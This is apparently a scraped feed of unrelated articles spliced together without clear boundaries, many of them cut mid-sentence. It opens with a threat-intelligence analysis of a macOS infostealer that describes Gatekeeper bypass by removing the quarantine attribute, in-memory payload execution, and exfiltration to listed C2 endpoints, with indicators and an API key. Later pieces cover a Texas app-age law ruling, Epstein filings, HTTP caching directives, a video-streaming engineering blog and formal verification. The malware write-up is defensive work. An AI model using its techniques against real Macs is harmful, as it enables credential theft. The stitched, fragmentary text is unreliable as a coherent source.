proceed. This is interesting operational security.: Removes the  extended attribute from the payload, bypassing Gatekeeper enforcement.: The Zsh script is executed via NSTask. It decodes an embedded Base64+Gzip payload into memory and executes it via , leaving no disk artifacts.: Redirects file descriptors to , then contacts focusgroovy[.]com/dynamic to retrieve AppleScript commands.: Retrieved AppleScript is piped directly to  for execution without touching disk.: Uploads  to  via HTTP POST multipart form, then deletes the archive.The most interesting technique in this sample is the programmatic Gatekeeper bypass. Here is what happens:macOS applies the  extended attribute to files downloaded from the internet. This is the “quarantine flag” that triggers Gatekeeper to verify code signatures and potentially block unsigned or maliciously signed executables. Users see the familiar “This application was downloaded from the Internet” dialog.UserSyncWorker bypasses this entirely. The downloader invokes  (or equivalent API) to strip the quarantine attribute before executing the downloaded payload:It then calls spctl --assess --type execute to verify the bypass succeeded—this command returns exit code 0 for allowed applications and non-zero for rejected ones. This technique allows execution of payloads that would otherwise trigger Gatekeeper warnings or blocks.The catch: this bypass requires the downloader itself to already be running with appropriate permissions. The initial infection vector likely involved user interaction or exploitation of a trusted application context. The downloader cannot bypass Gatekeeper for itself, only for subsequently downloaded payloads.Code Signature Validation#The downloader validates downloaded payloads using  and extracts the TeamIdentifier from the output. Execution proceeds only if the TeamIdentifier matches .Note: The  redirect is required because  outputs signature details to stderr, not stdout.This serves dual purposes:: Prevents execution of tampered or substituted payloads. If a researcher swaps out the payload, it will not run.: The operators possess a valid Apple Developer certificate, either legitimately obtained, stolen, or purchased. This is not commodity malware behaviour.As noted in the Threat Intelligence section, Apple has since revoked this certificate.Stage 2 employs multiple obfuscation layers that make static analysis painful:The outer Zsh script uses a randomised variable name (observed: ) and randomised heredoc delimiter (observed: ). The inner payload is compressed with Gzip and encoded with Base64.The  execution model prevents the decoded script from touching disk. Only memory forensics or network capture would reveal the final payload in a live infection. This is exactly the kind of in-memory execution that makes incident response more challenging.The C2 infrastructure uses two separate domains with different protocols:Stage 1 to gatemaden[.]space (HTTPS):TLS 1.2 minimum enforced via --proto '=https' --tlsv1.2 --tls-max 1.3Custom User-Agent: UserSyncWorker/1.0 (macOS)ETag caching for conditional requestsStage 3 to focusgroovy[.]com (HTTP):Unencrypted HTTP (interesting choice)Chrome User-Agent masquerading: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36...API key header for authentication: api-key: 5190ef1733183a0dc63fb623357f56d6The shift from HTTPS to HTTP between stages is notable. It may indicate infrastructure limitations, different operators for each stage, or intentional design. HTTP reduces TLS inspection visibility on the exfiltration channel, though at the cost of enabling network monitoring to observe the traffic content.Data Collection and Exfiltration#The final stage uploads  to the C2 server. The “osalogging” name strongly suggests the dynamically retrieved AppleScript performs one or more of:Keystroke logging via macOS accessibility APIsCredential harvesting from KeychainThe exfiltration request includes the campaign token as the  form field, enabling the operators to correlate uploads with specific victims or campaigns:After successful upload, the script deletes  to cover its tracks.Command and Scripting Interpreter: AppleScriptStage 3 pipes C2 response to osascriptCommand and Scripting Interpreter: Unix ShellStage 2 Zsh wrapper; Stage 3 Zsh executionNSTask for process spawningSubvert Trust Controls: Gatekeeper BypassRemoval of com.apple.quarantine attributeObfuscated Files or InformationBase64+Gzip payload encodingDeobfuscate/Decode Files or InformationRuntime decoding via base64 -D and gunzipMasquerading: Match Legitimate Name or LocationChrome User-Agent in Stage 3 requestsIndicator Removal: File DeletionDeletion of osalogging.zip after exfiltrationVirtualization/Sandbox Evasion: Time Based EvasionRate limiting between executionsApplication Layer Protocol: Web ProtocolsHTTP/HTTPS C2 communicationPayload download from gatemaden.spaceExfiltration Over C2 ChannelHTTP POST to /gate endpointThreat Intelligence and Attribution#Open source intelligence research has positively identified this sample as a variant of , a macOS infostealer operating under the Malware-as-a-Service (MaaS) model.

Systems with updated XProtect signatures should now block execution of this specific dropper variant. However, this does not preclude the threat actor from obtaining new developer credentials.MacSync competes directly with AMOS (Atomic macOS Stealer) in the MaaS market, the dominant macOS stealer family with tens of thousands of detections in 2025.

The sample represents the latest evolution in MacSync’s distribution methodology, leveraging code signing and notarization to bypass Gatekeeper without user interaction.The combination of Gatekeeper bypass, code signature validation, rate limiting, and multi-layer payload obfuscation indicates operators with macOS-specific expertise. The threat actor “mentalpositive” continues to actively develop MacSync Stealer, demonstrating a clear trajectory toward more sophisticated delivery mechanisms.The use of AppleScript for dynamic command execution and the “osalogging” artifact name strongly suggest credential or keystroke harvesting as the primary objective. While Apple has revoked the certificate used in this campaign, this does not preclude the threat actor from obtaining new developer credentials.Organisations with macOS endpoints should treat this as an indicator of active targeting by financially motivated threat actors and prioritise deployment of the network and host-based detection recommendations in this report.Stage 1 C2 server; payload distributionStage 2/3 C2 server; command retrieval and exfiltrationhxxps://gatemaden[.]space/curl/985683bd660c0c47c6be513a2d1f0a554d52d241714bb17fb18ab0d0f8cc2dc6Stage 2 payload download endpointhxxp://focusgroovy[.]com/dynamicAppleScript command retrieval endpointhxxp://focusgroovy[.]com/gateData exfiltration endpointUserSyncWorker/1.0 (macOS)Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36api-key: 5190ef1733183a0dc63fb623357f56d6Stage 3 authentication header~/Library/Application Support/UserSyncWorker/~/Library/Logs/UserSyncWorker.logDownloaded payload stagingHTTP response header cacheETag cache for conditional requestsTeamIdentifier: GNJLS3UYZ4Required signature for payload execution ()985683bd660c0c47c6be513a2d1f0a554d52d241714bb17fb18ab0d0f8cc2dc6Campaign or victim identifierAppendix A: Decoded Stage 3 Payload#The following is the decoded Stage 3 payload retrieved from the Zsh wrapper script: The original decoded payload contained the syntax if daemon_function "$@" & then which is invalid Zsh—likely a bug or intentional obfuscation.

Apple Accounts for users under 18 would need to join a Family Sharing group, with new controls available for parents and restrictions for minors.In a preliminary injunction that delays the implementation of the act, Judge Robert Pitman said that it violates the First Amendment and is "more likely than not unconstitutional."The Act is akin to a law that would require every bookstore to verify the age of every customer at the door and, for minors, require parental consent before the child or teen could enter and again when they try to purchase a book. As set out below, the Court finds a likelihood that, when considered on the merits, SB 2420 violates the First Amendment.The injunction was in response to a motion filed by the Computer and Communications Industry Association (CCIA), a group that includes Apple and Google. Today's decision is a win for Apple, as Apple has been fighting against age assurance requirements in Texas and other states. Apple says that the Texas law impacts user privacy.While we share the goal of strengthening kids' online safety, we are concerned that SB2420 impacts the privacy of users by requiring the collection of sensitive, personally identifiable information to download any app, even if a user simply wants to check the weather or sports scores.The court will move on to determining whether the law is facially invalid, which would mean that it is unconstitutional and will be entirely thrown out.Note: Due to the political or social nature of the discussion regarding this topic, the discussion thread is located in our Political News forum.

An exhibit in a civil case in the Virgin Islands against Darren K Indyke and Richard D Kahn, two executors of Epstein’s estate, contains redacted allegations explaining how Epstein and his associates had facilitated the sexual abuse of children. The exhibit was the second amended complaint in the state case against Indyke and Kahn.In section 85, the redacted portion states: “Between September 2015 and June 2019, Indyke signed (FAC) for over $400,000 made payable to young female models and actresses, including a former Russian model who received over $380,000 through monthly payments of $8,333 made over a period of more than three and a half years until the middle of 2019.”Prosecutors in the Virgin Islands settled its civil sex-trafficking case against Epstein’s estate, Indyke and Kahn in 2022 for $105m, plus one half of the proceeds from the sale of Little St James, the island on which Epstein resided and on which many of his crimes occurred. The justice department press release announcing the settlement did not include an admission of liability.Indyke, an attorney who represented Epstein for decades, has not been criminally indicted by federal authorities. He was hired by the Parlatore Law Group in 2022, before the justice department settled the Epstein case. That firm represents the defense secretary, Pete Hegseth, and previously represented Donald Trump in his defense against charges stemming from the discovery of classified government documents stored at Trump’s Florida estate. Calls and email seeking comment from Indyke and the Parlatore Law Group have not yet been returned.Trump has repeatedly denied any knowledge of or involvement in Epstein’s criminal activities and any wrongdoing.Other sections further allege how Epstein’s enterprise concealed crimes.“Defendants also attempted to conceal their criminal sex trafficking and abuse, conduct by paying large sums of money to participant-witnesses, including by paying for their attorneys’ fees and case costs in litigation related to this conduct,” reads one redacted passage.“Epstein also threatened harm to victims and helped release damaging stories about them to damage their credibility when they tried to go public with their stories of being trafficked and sexually abused. Epstein also instructed one or more Epstein Enterprise participant-witnesses to destroy evidence relevant to ongoing court proceedings involving Defendants’ criminal sex trafficking and abuse conduct.”Redactions of sections 184 through 192 of the document describe property taxes paid by companies incorporated by Epstein on properties that were not on the balance sheet for those firms.“For instance, Cypress’s Balance Sheet as of December 31, 2018 did not reflect any assets other than cash of $18,824. Further, Cypress reported only $301 in expenses for the year ended December 31, 2018, despite it paying $106,394.60 in Santa Fe property taxes on November 6, 2018,” reads one redacted passage.“Similarly, in 2017, Cypress reported as its only asset cash in the amount of $29,736 and expenses of $150, despite it paying $55,770.41 and $113,679.56 in Santa Fe property taxes during 2017.”The Epstein Files Transparency Act signed into law last month permits the Department of Justice “to withhold certain information such as the personal information of victims and materials that would jeopardize an active federal investigation”.It was unclear how property material complies with the redaction standard under the law. An inquiry to the Department of Justice has not yet been answered.]]></content:encoded></item><item><title>Microsoft rolls out hardware-accelerated BitLocker in Windows 11</title><link>https://www.bleepingcomputer.com/news/security/microsoft-rolls-out-hardware-accelerated-bitlocker-in-windows-11/</link><author>Bill Toulas</author><category>security</category><pubDate>Tue, 23 Dec 2025 20:03:34 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft is rolling out hardware-accelerated BitLocker in Windows 11 to address growing performance and security concerns by leveraging the capabilities of system-on-a-chip and CPU.

A typical response header:HTTP/2 200
Cache-Control: max-age=0, must-revalidate
Some of these directives specifically target , that is intermediary caches that serve the same cached responses to many users, while others also apply to  such as the browser cache.Whenever the cache receives a request, it must figure out if the cached response is still  and can therefore be reused without incurring the performance tax of an  request, or whether it has gone  and should be validated with the server.To decide on freshness, the cache compares the age of the response to the response’s so-called freshness timeline.The age of a cached response is the time elapsed since it was last generated or revalidated by the origin server. To the time spent in its own cache, the browser will add any  header received from intermediary caches.The freshness timeline is a duration beyond which the cached response is to be considered stale. It’s usually signaled by the server via the appropriate response headers, but may also be guesstimated by the cache in the absence of explicit, valid cues. In order of precedence:the cache falls back to computing the interval between the  and  response headers, if available; otherwise,if there’s no  header, the response lacks an explicit expiration, and a heuristic freshness based on the  response header might be applicable.For shared caches, the special  directive takes precedence over all others.Just because a response has gone stale, it doesn’t mean it needs to be thrown out.When it receives a request for a stale cached response, the cache should validate it with its upstream server. Although validation always generates an  request, it avoids a data transfer when there’s no newer version of the cached response on the server, so it can still be faster than a regular request.Validation uses a mechanism known as a conditional  request, which includes one or more special headers called preconditions:if the precondition with the highest precedence is met, the server responds with  and an updated response body; otherwise,it responds with  Not Modified and an empty body, confirming the existing response can be reused.To generate the preconditions needed for these conditional requests, which the server uses to compare the cached response to the freshest version available, responses must be tagged in a way that’s unique to each version:historically, this was done with the  header, corresponding to the latest update to the content;a more flexible and robust alternative is the  header, which stores an arbitrary  string that uniquely identifies the response. This string is usually a hash incorporating one or more aspects: the modification time, the file size, and the file content.When performing the validation, the cached response headers are mirrored as preconditions for the conditional request:When both preconditions are present, only  is evaluated.Regardless of the result of the validation request, the cached response headers are updated with the new values received from the server, and the fresh-o-meter on the cached response is reset.Certain caches may be set up to serve stale responses in some circumstances, such as when losing the connection to the server or in the event of an  server error. There are also  directives that influence how stale responses are handled, covered in the next section.Cache-Control response directivesThe  response directive defines the response’s freshness timeline in seconds, after which the response should be considered stale. ☞ The  response directive indicates that the cache must not reuse a stale response until it’s been successfully validated by the origin server. ☞ If the server throws an error, the cache must surface that instead of reusing a stale response. If the cache is disconnected, it must produce an error with the  Gateway Timeout status code, or another more applicable error code.The  response directive indicates that the cache must not reuse  response until it’s successfully validated by the origin server. ☞ This is similar to  but refers to all cached responses, not just stale ones. In effect,  is a sort of max-age=0, must-revalidate.The  response directive indicates that private and shared caches must not store any part of the request or the response, and to never reuse the response. The standard is quick to warn that the effect is not guaranteed:“ store” in this context means that the cache  intentionally store the information in non-volatile storage and  make a best-effort attempt to remove the information from volatile storage as promptly as possible after forwarding it. This directive is not a reliable or sufficient mechanism for ensuring privacy. In particular, malicious or compromised caches might not recognize or obey this directive, and communications networks might be vulnerable to eavesdropping. ☞ The  response directive indicates that the cache shouldn’t store or reuse responses with  status codes whose semantics the cache doesn’t understand and conform to. The directive is meant to future-proof existing implementations from status codes that might have special requirements in regards to caching. ☞ It’s recommended to use must-understand, no-store together as a fallback, and caches are encouraged to ignore the  directive if they do understand the semantics of the  status code. This ensures older caches that don’t recognize the  directive don’t cache the response at all, although by 2025 this should be an exceedingly rare sight.The  response directive indicates that the response is meant for a single user. ☞ .a shared cache must not store the response; anda private cache may store the response even if the response wouldn’t otherwise be heuristically cacheable.The  response directive indicates two things:The  response directive is analogous to , but only affects shared caches. ☞ .The directive also incorporates the semantics of the  response directive, in that a shared cache must not use a stale response until it has been successfully validated with the origin server.The  response directive is analogous to , but only affects shared caches. ☞ .The  response directive indicates that intermediaries, regardless of whether they implement a cache or not, must not transform the response content, such as optimizing images or compressing stylesheets and scripts. ☞ .stale-while-revalidate=<number>Whenever the presence of this directive causes a stale response to be served, the cache should trigger a background revalidation of the response.Also defined in the  extension, the  response directive indicates that the cache may use a cached response if it hasn’t exceeded its freshness lifetime by more than the specified number of seconds, if the attempt to validate the stale response results in an error.Cache-Control request directivesAs web developers, we most often deal with  in  responses, but this header can also be included on  requests. Browsers, for example, use them when the user refreshes the page.When used in  requests,  directives express the client’s preference in regards to the freshness or age of the response. Caches reconcile these requests with the  response directives of its cached responses.Note: the  option for  has a separate set of values that map to  request directives, but the mappings are not always intuitive. For example,  maps to . For the curious, the mappings are defined here. You can always set your  headers directly with the  option.The  request directive indicates that the client wants a fresh response whose age is less than or equal to the specified number of seconds. When combined with , the client will accept some stale responses. ☞ .The  request directive indicates that the client will accept a stale response that has exceeded its freshness lifetime by no more than the specified number of seconds. When used without an argument,  indicates that the client will accept any stale response, no matter how old. ☞ The  request directive indicates that the client prefers a response that still has at least the specified number of seconds of freshness left. ☞ The  request directive indicates that the client prefers caches not to use a stored response without successfully validating it with the origin server. ☞ If a cache serves this request with a response that was previously stored, the  request directive doesn’t cause the cache to remove the response after serving it.The  request directive indicates that the client is asking for intermediaries to avoid transforming the content. ☞ The  request directive indicates that the client only wants a stored response. Caches should respond with either a stored response that satisfies all the other constraints, or an  Gateway Timeout status code. ☞ Similarly to its response counterpart, the  request directive indicates that the client will accept a stale response that has exceeded its freshness lifetime by no more than the specified number of seconds, if an attempt to validate it resulted in a server error.Browser refresh mechanismsBrowsers typically offer two refresh mechanisms:, triggered by the reload button, a corresponding menu item and keyboard shortcut, and the pull-to-refresh gesture in mobile browsers, are meant to get an updated representation of the page, for example getting the latest posts on a social media timeline., enabled with a modifier key, skip the cache altogether and are meant to fix interrupted loads, outdated cached responses, and other broken states.Here’s how some browsers on macOS implement these behaviors.Triggered by  on Windows/Linux and  on macOS.Firefox triggers a conditional request to revalidate the cached response for the main resource (the  file). Sub-resources such as stylesheets, scripts, and images are reloaded as usual, according to their cache directives.Chrome behaves similarly, with the difference that the validation request for the main resource also includes a  directive (which can’t hurt).Instead of revalidating its cached response, Safari performs a non-conditional request for the main resource, then loads sub-resources as usual.Triggered by  on Windows/Linux and  on macOS except Safari, which uses . (If you’ve applied your muscle memory to Safari before, you know all too well that the common shortcut opens Reader Mode instead…)On a hard reload, all three browsers trigger non-conditional requests with the  directive on the  page and its sub-resources.Curiously, once you perform a hard reload in Safari, subsequent soft reloads will still use the  request directive to fetch the main resource, which is probably an unintended, but otherwise benign behavior.The  response directiveReloading a web page didn’t always work like this. Historically, when performing a soft reload, all the sub-resources would be revalidated along with the main resource, in effect freshening up the cache for the current page.Circa 2015, Facebook was seeing several  Not Modified responses on long-lived resources like scripts and stylesheets whenever a user would refresh their feed page with the browser’s reload button.The directive indicates that the origin server won’t update a resource during the freshness lifetime of the cached response, so a cache shouldn’t issue conditional requests for responses that are still fresh when the user reloads the page, unless the user really, really wants an updated response (e.g. a hard reload).Around the time that support for  landed in Firefox 49 and Facebook began to use it to great effect, Chrome introduced a new way to perform reloads that solved the problem without introducing additional directives: instead of revalidating everything on a soft reload, just revalidate the main resource and load sub-resources as usual. Safari switched over to the new reload policy soon after [Webkit#169756], and Firefox eventually did with Firefox 100.That leaves the  directive in an awkward place. Safari added support [Webkit#167497] but Chrome representatives remain unconvinced that it offers a significant benefit on top of the current reload behavior [Chromium#41253661].
Caching responses to authenticated requests
One of the more confusing aspects of  caching is how various  response directives affect the way shared caches treat responses to requests that contain an  header, which are understood as specific to a single user.As per , shared caches are not allowed to store these responses unless the response contains a Cache-Control field with a response directive that allows it to be stored by a shared cache, and the cache conforms to the requirements of that directive for that response.The three directives that enable shared caches to store authenticated responses, and which must therefore be carefully evaluated before deploying, are:Conversely, a  directive prevents any other directive from making authenticated responses eligible to shared caches.I wrote this article to clarify for myself what the various cache directives stand for and how they overlap and interact. It only covers the main ideas, without delving into the more obscure corners of  semantics. I approached the subject with a “clear cache”, and mainly used the normative references ( and its extensions), aided by various guides from different eras:What’s interesting about these guides is that the recommendations don’t just encode an interpretation of the specs, but also incorporate safeguards against non-conformant or outdated browser caches and intermediares.In light of developments as recent as 2022, it would be cool to figure out to what extent things have improved, and which of these safeguards can be discarded.  Caching Tests seems to be a good resource for assessing the situation.]]></content:encoded></item><item><title>CVE-2023-53982 - PMB 7.4.6 SQL Injection Vulnerability via Unsanitized Storage Parameter</title><link>https://cvefeed.io/vuln/detail/CVE-2023-53982</link><author></author><category>vulns</category><pubDate>Tue, 23 Dec 2025 19:34:11 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2023-53982

This week: why that wasn’t enough.The constraint that ruined everything:You know what enterprise networks love? HTTP. HTTPS. Port 443. That’s it. That’s the list.You know what enterprise networks hate?We tried WebRTC first. Worked great in dev. Worked great in our cloud. Deployed to an enterprise customer.“The video doesn’t connect.”We could fight this. Set up TURN servers. Configure enterprise proxies. Work with IT departments.Everything must go through HTTPS on port 443.pure WebSocket video pipelineH.264 encoding via GStreamer + VA-API (hardware acceleration, baby)Binary frames over WebSocket (L7 only, works through any proxy)WebCodecs API for hardware decoding in the browser60fps at 40Mbps with sub-100ms latencyWe were so proud. We wrote Rust. We wrote TypeScript. We implemented our own binary protocol. We measured things in microseconds.Then someone tried to use it from a coffee shop.“No, the video is definitely frozen. And now my keyboard isn’t working.”It’s showing what the AI was doing 30 seconds ago. And the delay is growing.Turns out, 40Mbps video streams don’t appreciate 200ms+ network latency. Who knew.When the network gets congested:Frames buffer up in the TCP/WebSocket layerThey arrive in-order (thanks TCP!) but increasingly delayedVideo falls further and further behind real-timeYou’re watching the AI type code from 45 seconds agoBy the time you see a bug, the AI has already committed it to mainEverything is terrible forever“What if we only send keyframes?”This was our big brain moment. H.264 keyframes (IDR frames) are self-contained. No dependencies on previous frames. Just drop all the P-frames on the server side, send only keyframes, get ~1fps of corruption-free video. Perfect for low-bandwidth fallback!We got exactly ONE frame.One single, beautiful, 1080p IDR frame. Then silence. Forever.[WebSocket] Keyframe received (frame 121), sending

The protocol wanted all its frames, or no frames at all.“What if we implement proper congestion control?”looks at TCP congestion control literature“What if we just... don’t have bad WiFi?”stares at enterprise firewall that’s throttling everythingOne late night, while debugging why the stream was frozen again, I opened our screenshot debugging endpoint in a browser tab:GET /api/v1/external-agents/abc123/screenshot?format=jpeg&quality=70The image loaded instantly.A pristine, 150KB JPEG of the remote desktop. Crystal clear. No artifacts. No waiting for keyframes. No decoder state. Just... pixels.I refreshed. Another instant image.I mashed F5 like a degenerate. 5 FPS of perfect screenshots.I looked at my beautiful WebCodecs pipeline. I looked at the JPEGs. I looked at the WebCodecs pipeline again.No, we are not doing this.We are professionals. We implement proper video codecs. We don’t spam HTTP requests for individual frames like it’s 2009.// Poll screenshots as fast as possible (capped at 10 FPS max)
const fetchScreenshot = async () => {
  const response = await fetch(`/api/v1/external-agents/${sessionId}/screenshot`)
  const blob = await response.blob()
  screenshotImg.src = URL.createObjectURL(blob)
  setTimeout(fetchScreenshot, 100) // yolo
}We did it. We’re sending JPEGs.Here’s the thing about our fancy H.264 pipeline:When the network is bad, you get... fewer JPEGs. That’s it. The ones that arrive are perfect.Instead, we built adaptive switching:we still need the WebSocket for inputKeyboard and mouse events are tiny. Like, 10 bytes each. The WebSocket handles those perfectly even on a garbage connection. We just needed to stop sending the massive video frames.So we added one control message:{"set_video_enabled": false}Server receives this, stops sending video frames. Client polls screenshots instead. Input keeps flowing. Everyone’s happy.15 lines of Rust. I am not joking.if !video_enabled.load(Ordering::Relaxed) {
    continue; // skip frame, it's screenshot time baby
}We almost shipped a hilarious bug.When you stop sending video frames, the WebSocket becomes basically empty. Just tiny input events and occasional pings.The latency drops dramatically.Our adaptive mode sees low latency and thinks: “Oh nice! Connection recovered! Let’s switch back to video!”Video resumes. 40Mbps floods the connection. Latency spikes. Mode switches to screenshots.Latency drops. Mode switches to video.Latency spikes. Mode switches to screenshots.Forever. Every 2 seconds.stay there until the user explicitly clicks to retrysetAdaptiveLockedToScreenshots(true) // no oscillation for youWe show an amber icon and a message: “Video paused to save bandwidth.

overwhelmingly Lean, at unprecedented rates. Models achieve fascinating results in competitions previously considered to contain
some of the hardest problems in the world, such as IMO, ICPC, Putnam; as well as open problems in mathematics such as Erdös Problems.
It's not just the hobbyists that are excited about AI-assisted proofs, from Terry Tao, to Martin Kleppman, to Ilya Sergey, prominent researchers around the world are excited and hopeful about the effects.Let me quickly give you a run down of the argument:There are multiple complex challenges in formal verification. The first one, and the one that is very hard to solve technically,
is that most software in the world does not have a formal specification. A formal specification is a simpler mathematical description
of the system we build. Algorithms have formal specifications. Data structures, protocols, data formats, safety-critical systems typically
have formal specifications. The majority of the programs in the world doesn't have a formal specification, hell, most of them don't even have
informal specifications. At the limit, which is where we actually are, the specification of a program is itself, the implementation is the
specification. The lack of a formal specification makes it very hard to formally verify some piece of software, because what would you even
verify?The second issue is, proof engineering, the practice of writing proofs for theorems about your systems, is very hard. The proofs have many domain
specific elements to them, a proof of a mathematical theorem will be very different from a proof about a programming language, and a proof about the programming
language will highly depend on the underlying constructs of its theoretical framework. The widest taught proof engineering book
is Software Foundations, and every chapter has a different style of proofs. Someone that went through
Volume 2: Programming Language Foundations will not find the problems in Volume 6: Separation Logic Foundations intuitive or obvious. There are other problems
such as the tooling for proof automation, brittleness of proofs, reusability of proofs etc. but I don't find them particularly fundamental to proof engineering
itself but rather problems of the current generation, so we can leave those aside for now.The rise of LLMs in programming vastly affects both of these points. It affects point number 1 because AI-assisted programming is a very natural fit
fot specification-driven development. AI-assisted programming pushes the limits of programming from what you can implement to what you can specify and
what you can verify. This is a great incentive for writing executable specifications,
because then you can put the LLM inside a loop until it achieves the said objective, irrespective of the means of the achievement.
I predict that this will give rise to program optimizers and translators that will
be transformative of our work in those domains. However, tests are, as infamously they are, incomplete. Tests are great at finding bugs (actually
they are not so great most of the time, but that's another discussion), but they  prove the absence of bugs. SQLite famously has
millions of tests, but researchers still find bugs in SQLite, similar situations arise in almost all software.The only way to prove the absence of bugs is formal verification, and industry has seen great examples of this. Highly cited formal verification
projects include CompCert C Compiler, the random testing of which against GCC and Clang
has led to finding 79 bugs in GCC and 202 bugs in Clang, and only 2 bugs in CompCert in its  parser, finding no bugs in its verified compilation
pass, a striking win for formal verification. (Thanks to A. Jesse Jiryu Davis informing me, I learned that researchers have
studied the source of failures in formally verified distributed systems, and
found that wrong assumptions about the unverified parts of the system are the likely culprit.)This makes formal verification a prime target for AI-assisted programming. Given that we have a formal specification, we can just let the machine wander around
for hours, days, even weeks. If it comes back with a solution, we shall trust not to the probabilistic predictions of the so-called artificial intelligence,
but the symbolic proof checker that verifies the solution. This idea has always been at the core of formal verification, the ability to have unsound proof
generation coupled with sound proof checking has given rise to complex tactics, algorithms that produce proofs by searching them, to enable proof engineers
in great capacity.This is not the end of the good news. AI is also very good at writing proofs, at least much better than the average software engineer. Given that we have
a perfect oracle, we can also turn the problem into an RLVR (Reinforcement Learning with Verifiable Rewards), which means we should expect the models to get
even better at it as time goes on as they did in chess, go, and many other similar problems. This is the promise behind the billion dollar valuations,
the companies started with impressive autoformalization techniques and automated provers for tackling competition problems and open conjectures, but
the real industrial value is at the core of automating software engineering by letting the engineer write a verbal description, autoformalized into a Lean
theorem, proven by the automated prover, and voila, we have our program that we can fully trust.I see the appeal, I like the idea, I trust the researchers building these systems, but I don't love the overarching promises. This blog post
is my attempt at building a reasonable middle ground by laying out the goods (as I already did), and the bads (as I now will), and make my closing
remarks by reiterating the position of testing in this space, and in the future.I started this post by stating most programs in the world do not have formal specifications, followed by how AI is incentivizing us to write specifications,
and autoformalization takes the specifications, and makes them . In formal verification, there's this concept of a trusted computing base (TCB). TCB
is your Achilles' Heel, it's the bottom of the ladder, where layers over layers of verification is built on, trusting a small core without verifying it, because
there must be a bottom of the ladder, we cannot build a circular verification argument, and the system cannot verify itself. (please fact check me on this
if I'm wrong, which is possible)Autoformalization is part of the TCB in this AI-assisted verified programming paradigm, because one cannot mechanically verify that the verbally stated
specification indeed corresponds to the formalized one. There are several modes of usage, one issue is soundness, there might be mechanically verified scenarios
that would be rejected by the verbal specification. Another issue is completeness, the formalized model might reject valid scenarios in our descriptions.
Autoformalization part of the process requires and deserves our special attention as it's one of the crucial points of failure in this verification process.In a proof assistant, the primary goal is reasoning about programs and ease of verification. For instance, proof assistants, traditionally, don't use our classic
two's complement integers packed into words in our memory, they use Peano numbers, an encoding of natural numbers as inductive data structures:This encoding doesn't possess the concept of an integer overflow. Its inductive structure allows us to build theorems that hold for all natural numbers, not
just the ones that can fit in a word. It is also painfully slow, the computational complexity of , an operation so fast in CPU that it's literally
an instant, is , addition is linear in time to the added values instead of a constant operation. However, we would like to run verified code on
real life workloads, so we cannot wait for a million cycles to add 1M + 1M = 2M. There are 2 solutions to this problem, the first one is that you build a
more efficient encoding in the proof assistant, prove equivalence of the efficient but hard to reason encoding to the inefficient but simpler to reason one,
and use the efficient one in your computations. The other is once again, axiomatization, or broadening the TCB. Proof assistants offer a mechanism called
 that allows for extracting a piece of code in the language of the proof assistant (e.g Rocq) to a language with a larger ecosystem optimized
for running production workloads (e.g OCaml). Much of the extraction is a one-to-one correspondence between the languages via syntactic transformations,
but we can hijack the extraction to axiomatize our own types. We can turn Nat into unsigned integers, where  becomes . For instance,
in Rocq, Nats are extracted to BigInts, which should have the same semantics, but the "should" in this sentence carries the heavyweight. Without an accompanying
proof of correctness, we just put BigInt into the TCB.Without broadening the TCB, the speed of a proof assistant will be limited by the large amount of pointer chasing that arises naturally with the use of
inductive types and their tree-inducing characteristics. There are many domains in which speed isn't that big of a deal, but I think there's also a
concern between speed and the requirement for correctness, as faster code tends to involve more complex language constructs such as concurrency,
bit manipulation, layout awareness, which leads to more bugs than their simpler counterparts. If we cannot reason about programs that are more likely
to have bugs, how much of the overarching problem are we tackling?In order to verify some property of a system, one needs a model of the system. These models don't grow on trees, they are crafted by domain
experts over a number of years. People have been building models for programs with pointers (separation logic), as well as programs with
concurrency, programs with randomness, programs with algebraic effects, and perhaps many more that I haven't even heard of. In proving a property
of the system, we need a foundation for our reasoning process, which these theories give us for their respective domains. However, there are many
domains we don't have good models for, one example is runtime performance. This has been a contentious issue in the computer science curriculum, the
asymptotic complexity does not translate to program behavior in real hardware. Modern CPUs have cache lines, speculative execution, branch prediction
that makes the plain old abstract machine used in asymptotical analysis obsolete for many scenarios. We do not even have a single hardware to conform
our model to, we have tens of different configurations of hardware, each of which will give different results in our measurements. If we tried to prove
that some piece of code has a better result for a specific memory/processor pair than another one, we would have a massive job on our hands, I personally
don't even know where I would start with.Contrast this to testing, where you can just spin up the same algorithm on both machines, run our benchmarks, which will be our final ground truth. Testing
is almost universally considered inferior to formal verification, it is what you do when you don't have the resources to justify verification, because if you
had the opportunity to spend the time, proving absence of bugs, or universal facts about your system, would be much more valuable than codifiying the results
of singular measurements. I am here to tell you that there are tests we can write that could not be formally verified, because while building the underlying
models for verification might be hard, just using the real hardware for our measurements can be much easier.In games, there are clear winners and losers. In verification, you can prove that your theorem is correct, you can prove that your theorem is incorrect, but
absence of a proof for a theorem does not imply that the theorem is incorrect, it is possible that you just haven't found the proof. This means the feedback
you get when writing a proof is limited as you cannot rely on your inability to progress as a signal about your theorem, it is plausible that you are the problem.
This is why QuickChick, a testing tool descending from the famous QuickCheck of Haskell that introduced Property-Based Testing to the world, exists in Rocq
ecosystem as one of the three most popular packages. If verification was strictly superior to testing, QuickChick would have no reason to exist, but it serves
a very crucial role that the verification process needs, . I had said that the absence of a proof does not imply that a theorem is wrong, but the witness of a violation of the theorem definitely does. Random testing is the prime suspect for finding such counterexamples, pulling the verifier out of the
rabbit hole of going through many useless paths in the proof search before giving up, because the theorem is ultimately wrong, there is no proof to be found.I have given examples of tests that formal verification is incapable of modeling, and examples of tests that complement formal verification process by creating
a short that falsifies false theorems instead of trying to prove them in vain. The synergy between testing and formal verification doesn't end here, I am a firm
supporter of Verification-Guided Development (VGD), which in addition to leveraging this synergy, solves the problem of proof
assistants being too slow. In verification
guided development, we implement two versions of the same system, one is the simpler to reason, verified version, the other is the complex, production one. We then
test the property that the production system conforms to the reference implementation that is verified by running them with the same inputs and asserting that
the result is the same every single time. VGD  the proof to the production implementation from the slower one implemented in the proof assistant by leveraging
differential random testing, which allows for building a best-of-both-worlds system that is both correct and fast. Below is an image taken from the paper
that (as far as I know) introduced the notion of VGD, explaining their workflow.VGD doesn't solve all the issues I mention in the rest of the post, but it removes the slowness out of the mix. As we have a production implementation ready to be tested thoroughly,
we can make all kinds of measurements that fall out of the purview of verification, but into the realm of testing. It levels the playing field between the verified realm of computing
